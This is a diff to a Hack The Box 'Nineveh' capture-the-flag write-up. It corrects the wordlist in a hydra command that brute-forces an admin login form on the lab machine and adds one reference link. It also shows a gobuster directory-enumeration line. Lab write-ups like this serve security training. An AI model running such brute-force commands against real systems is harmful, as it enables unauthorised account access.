@@ -46,7 +46,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-m
 
 + Brute force using the wordlist: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt`
 ```
-hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 -f
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 -f
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e7a8f92b-97ca-4876-8cd3-84091385722d)
@@ -221,3 +221,4 @@ Try ssh connection [analyzing **secure_notes** image file](https://rana-khalil.g
 + https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit
 + https://benheater.com/hackthebox-nineveh/
++ https://systemweakness.com/htb-nineveh-writeup-8cf43e5a605d
